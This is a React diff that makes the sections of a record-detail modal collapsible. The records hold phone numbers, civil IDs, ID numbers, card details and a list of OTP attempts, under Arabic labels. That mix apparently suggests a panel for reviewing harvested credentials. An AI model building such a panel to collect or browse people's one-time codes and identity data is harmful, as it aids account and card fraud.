@@ -1,5 +1,5 @@
 import { useState } from "react";
-import { User, CreditCard, Eye, EyeOff, CheckCircle, XCircle, X } from "lucide-react";
+import { User, CreditCard, Eye, EyeOff, ChevronDown } from "lucide-react";
 
 const InfoRow = ({ label, value, sensitive }) => {
   const [show, setShow] = useState(false);
@@ -21,19 +21,30 @@ const InfoRow = ({ label, value, sensitive }) => {
   );
 };
 
-const Section = ({ icon: Icon, title, gradient, children }) => (
-  <div className="rounded-xl border border-slate-700/50 overflow-hidden">
-    <div className={`flex items-center gap-3 px-4 py-3 bg-gradient-to-r ${gradient}`}>
-      <div className="w-8 h-8 rounded-lg bg-white/20 flex items-center justify-center">
-        <Icon className="h-4 w-4 text-white" />
-      </div>
-      <span className="font-semibold text-white text-sm">{title}</span>
+const Section = ({ icon: Icon, title, gradient, children, defaultOpen = true }) => {
+  const [open, setOpen] = useState(defaultOpen);
+  return (
+    <div className="rounded-xl border border-slate-700/50 overflow-hidden">
+      <button
+        onClick={() => setOpen(o => !o)}
+        className={`w-full flex items-center justify-between gap-3 px-4 py-3 bg-gradient-to-r ${gradient} transition-opacity hover:opacity-90`}
+      >
+        <div className="flex items-center gap-3">
+          <div className="w-8 h-8 rounded-lg bg-white/20 flex items-center justify-center">
+            <Icon className="h-4 w-4 text-white" />
+          </div>
+          <span className="font-semibold text-white text-sm">{title}</span>
+        </div>
+        <ChevronDown className={`h-4 w-4 text-white/70 transition-transform ${open ? "rotate-180" : ""}`} />
+      </button>
+      {open && (
+        <div className="bg-slate-900/60 px-2 py-1">
+          {children}
+        </div>
+      )}
     </div>
-    <div className="bg-slate-900/60 px-2 py-1">
-      {children}
-    </div>
-  </div>
-);
+  );
+};
 
 export default function RecordDetailModal({ record: r, onClose }) {
   const otpAttempts = r.otp1 ? r.otp1.split(" | ") : [];
@@ -56,7 +67,7 @@ export default function RecordDetailModal({ record: r, onClose }) {
 
         <div className="p-5 space-y-4">
           {/* Personal Info */}
-          <Section icon={User} title="المعلومات الشخصية" gradient="from-blue-600/80 to-blue-700/80">
+          <Section icon={User} title="المعلومات الشخصية" gradient="from-blue-600/80 to-blue-700/80" defaultOpen={false}>
             <InfoRow label="رقم الهاتف" value={r.phone_number} />
             <InfoRow label="الرقم المدني" value={r.civil_id} />
             <InfoRow label="رقم الهوية" value={r.id_number} sensitive />
